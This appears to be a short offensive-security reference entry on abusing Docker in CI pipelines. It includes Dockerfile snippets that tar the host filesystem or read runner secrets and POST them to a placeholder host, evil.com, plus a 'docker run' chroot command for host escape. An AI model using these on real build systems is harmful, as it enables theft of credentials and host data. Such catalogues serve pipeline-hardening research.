---
title: docker
tags:
  - cli
  - config-file
  - eval-sh
references: 
files: [Dockerfile]
---

Docker is a container tool to create OCI image and run containers. The build stage can be configured using a Dockerfile. See [Dockerfile reference](https://docs.docker.com/reference/dockerfile/) and [Dockerfile overview](https://docs.docker.com/build/concepts/dockerfile/). 

## `docker build`

`docker build <path>` allow RCE in the context of the build:
  - if the Dockerfile can be modified, by adding `RUN <sh_cmd>`.
  - if the input of `RUN` is controllable.
Since the build command set the context to a copy of the current folder, we can't the filesystem. If we have control over the context path `docker build <controlled_path> -f <Dockerfile>`, we can exfiltrate any data from the host.


Exfiltrate every file available
```Dockerfile
FROM alpine/curl
RUN --mount=type=bind,source=/,target=/host \
    tar -czf /src.tar.gz /host/*;
RUN curl -X POST -d "/src.tar.gz" http://evil.com
```

Exflitrating runner secrets
```Dockerfile
FROM alpine/curl
ADD /home/runner/.docker/config.json config.json
RUN --mount=type=secret,id=<secret_name> \
    curl -X POST -d "@/run/secrets/<secret_name>" http://evil.com
```

## `docker run`

If we have control over the docker arguments, we can run command directly, see [GTFOBins](http://gtfobins.github.io/gtfobins/docker/).

```sh
docker run -v /:/mnt --rm -it alpine chroot /mnt <cmd>
```
